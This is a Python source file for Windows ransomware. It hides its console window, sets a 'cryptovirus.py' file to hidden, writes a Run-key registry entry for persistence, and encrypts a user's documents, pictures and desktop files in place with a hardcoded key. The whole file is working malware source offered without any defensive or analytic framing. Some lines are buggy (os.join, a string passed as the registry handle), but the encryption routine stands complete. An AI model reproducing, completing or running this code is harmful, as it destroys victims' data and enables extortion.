#!/usr/bin/python3.8
import win32con, winreg, win32api
import os
import win32gui
from cryptography.fernet import Fernet
import getpass
import glob


def hide_console():
    # Hides the terminal console to prevent suspicion while working
    # in background
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)


def incognito():
    # Hides the virus file in the system
    usr = getpass.getuser()
    path = 'C:/Users/' + usr
    for virus in glob.glob(path + '/**/cryptovirus.py', recursive=True):
        win32api.SetFileAttributes(virus, win32con.FILE_ATTRIBUTE_HIDDEN)


def add_registry():
    path = os.path.dirname(os.path.realpath(__file__))
    worm_name = "worm.py"
    address = os.join(path, worm_name)
    key = "HKEY_CURRENT_USER"
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(open, "any_name", 0, winreg.REG_SZ, address)
    winreg.CloseKey(open)


def encrypt_files():
    # This function encrypts the files with a key
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="

    # Get files to encrypt
    if True:
        usr = getpass.getuser()
        path = 'C:/Users/' + usr + '/Documents'
        for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
                      + glob.glob(path + '/**/*.zip', recursive=True):
            # Start encryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)

            with open(f_name, "wb") as file:
                file.write(encrypted_data)

        # Get pictures to encrypt
        path = 'C:/Users/' + usr + '/Pictures'
        for f_name in glob.glob(path + '/**/*.jpg', recursive=True) \
                      + glob.glob(path + '/**/*.jpeg', recursive=True) \
                      + glob.glob(path + '/**/*.png', recursive=True) \
                      + glob.glob(path + '/**/*.svg', recursive=True):
            # Start encryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)

            with open(f_name, "wb") as file:
                file.write(encrypted_data)

        # Get documents in desktop to encrypt
        path = 'C:/Users/' + usr + '/Desktop'
        for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
                      + glob.glob(path + '/**/*.zip', recursive=True):
            # Start encryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)

            with open(f_name, "wb") as file:
                file.write(encrypted_data)


def main():
    hide_console()
    incognito()
    add_registry()
    encrypt_files()


if __name__ == "__main__":
    main()
